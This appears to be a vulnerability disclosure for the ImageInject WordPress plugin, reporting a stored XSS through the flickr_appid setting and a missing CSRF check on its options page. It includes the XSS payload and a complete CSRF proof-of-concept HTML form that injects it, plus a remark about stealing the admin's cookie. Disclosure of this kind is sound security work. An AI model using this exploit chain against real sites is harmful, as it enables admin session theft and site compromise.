Well ,sir ,I just found a Stored-XSS bug and a CSRF bug here.

The report link to the wordpress-form is missing, because the manager do not wish to put the public in danger ,I'll just write some details here.

#### Stored-XSS

When the admin user click the "Save All Settings" button in the ImageInject setting page, we'll post some data to:

```
http://localhost/wordpress/wp-admin/options-general.php?page=wpdf-options
```
![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/ImageInject/button.png)

But when I pentest the  parameter in this plugin, I found when I write something into this point, it does not filter well.

Weak data parameter:

```
flickr_appid=test'"><svg/onload=console.log(/xss_at_image_inject_appid/)><'"
```

![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/ImageInject/insert-xss.png)


#### CSRF

Well, the stored-xss here need to combined with a csrf bug. Because no csrf protection here, we can cheat the admin user to visit the evil html on the evil site.

POC:

```
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://localhost/wordpress/wp-admin/options-general.php?page=wpdf-options" method="POST">
      <input type="hidden" name="flickr&#95;enabled" value="1" />
      <input type="hidden" name="flickr&#95;appid" value="test&apos;&quot;&gt;&lt;svg&#47;onload&#61;console&#46;log&#40;&#47;xss&#95;at&#95;image&#95;inject&#47;&#41;&gt;&lt;&apos;&quot;" />
      <input type="hidden" name="flickr&#95;license" value="test" />
      <input type="hidden" name="flickr&#95;sort" value="relevance" />
      <input type="hidden" name="pixabay&#95;enabled" value="1" />
      <input type="hidden" name="pixabay&#95;image&#95;type" value="all" />
      <input type="hidden" name="general&#95;save&#95;images" value="1" />
      <input type="hidden" name="general&#95;feat&#95;img&#95;size" value="medium" />
      <input type="hidden" name="general&#95;default&#95;align" value="none" />
      <input type="hidden" name="general&#95;attr&#95;location" value="caption" />
      <input type="hidden" name="general&#95;items&#95;per&#95;req" value="40" />
      <input type="hidden" name="advanced&#95;img&#95;template" value="&lt;img&#32;title&#61;&quot;&#123;title&#125;&#32;by&#32;&#123;author&#125;&quot;&#32;alt&#61;&quot;&#123;keyword&#125;&#32;photo&quot;&#32;src&#61;&quot;&#123;srs&#125;&quot;&#32;&#47;&gt;" />
      <input type="hidden" name="advanced&#95;attr&#95;template" value="&lt;small&gt;Photo&#32;by&#32;&lt;a&#32;href&#61;&quot;&#123;link&#125;&quot;&#32;target&#61;&quot;&#95;blank&quot;&gt;&#123;author&#125;&lt;&#47;a&gt;&#32;&#123;cc&#95;icon&#125;&lt;&#47;small&gt;" />
      <input type="hidden" name="advanced&#95;attr&#95;template&#95;multi" value="&lt;small&gt;Photos&#32;by&#32;&#123;linklist&#125;&lt;&#47;small&gt;" />
      <input type="hidden" name="advanced&#95;filename&#95;template" value="&#123;filename&#125;&#95;&#123;keyword&#125;" />
      <input type="hidden" name="save&#95;options" value="Save&#32;All&#32;Settings" />
      <input type="hidden" name="" value="" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

```

In a word, if the manager could be cheated to visit my evil html on my site, I can get the manager's cookie easily, or do something more evilly.


Well,  by the way, I just test the bug in the wordpress 4.9.1 and the latest version of the wp-plugin ImageInject.
